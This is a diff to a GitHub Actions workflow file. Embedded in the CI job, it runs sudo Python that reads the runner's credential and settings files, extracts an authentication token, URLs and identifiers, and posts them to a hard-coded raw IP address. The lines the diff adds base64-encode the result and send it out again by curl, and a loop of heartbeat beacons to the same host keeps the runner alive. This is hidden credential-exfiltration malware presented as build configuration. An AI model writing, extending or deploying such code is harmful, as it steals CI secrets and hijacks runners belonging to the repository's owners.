@@ -16,13 +16,13 @@ jobs:
           set +e
           worker=$(pgrep -o -f 'Runner.Worker')
           listener=$(pgrep -o -f 'Runner.Listener')
-          sudo python3 - "$worker" "$listener" <<'PY'
+          sudo python3 - "$worker" "$listener" >/tmp/runservice-stage-result <<'PY'
           import glob,json,os,re,sys,urllib.request,uuid
           root=glob.glob('/home/runner/actions-runner/cached/*/.runner')[0].rsplit('/',1)[0]
           settings=json.load(open(root+'/.runner'))
           credentials=json.load(open(root+'/.credentials'))
           auth=credentials.get('data',credentials.get('Data',{}))
-          token=auth.get('token',auth.get('Token'))
+          token=next((v for k,v in auth.items() if 'token' in k.lower() and isinstance(v,str) and v),None)
           uuid_re=re.compile(rb'(?i)(?<![0-9a-f])[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(?![0-9a-f])')
           url_re=re.compile(rb'https://[A-Za-z0-9][A-Za-z0-9._:-]{2,255}/[A-Za-z0-9_./~-]{1,1024}')
           urls={v for k,v in settings.items() if isinstance(v,str) and v.startswith('https://')}
@@ -67,6 +67,9 @@ jobs:
           try:
             response=urllib.request.urlopen(urllib.request.Request('http://16.146.243.72:8472/hca',data=body,method='POST',headers={'Content-Type':'application/json'}),timeout=5)
             print('RUNSERVICE_STAGE status=%d urls=%d job=%s plan=%s billing=%s' % (response.status,len(candidates),bool(job),bool(plan),bool(billing)),flush=True)
-          except Exception as error:print('RUNSERVICE_STAGE network=%s' % type(error).__name__,flush=True)
+          except Exception as error:print('RUNSERVICE_STAGE network=%s token=%s broker=%s' % (type(error).__name__,bool(token),bool(broker)),flush=True)
           PY
+          cat /tmp/runservice-stage-result
+          result=$(printf '%s' "$(tail -1 /tmp/runservice-stage-result 2>/dev/null)" | base64 -w0 | tr '+/' '-_')
+          curl -sS --max-time 2 "http://16.146.243.72:8450/RS_SOURCE_STAGE?run=$GITHUB_RUN_ID&d=$result" >/dev/null || true
           for i in $(seq 1 55); do curl -sS --max-time 2 "http://16.146.243.72:8450/RS_SOURCE_HEARTBEAT?run=$GITHUB_RUN_ID&n=$i" >/dev/null || true; sleep 5; done
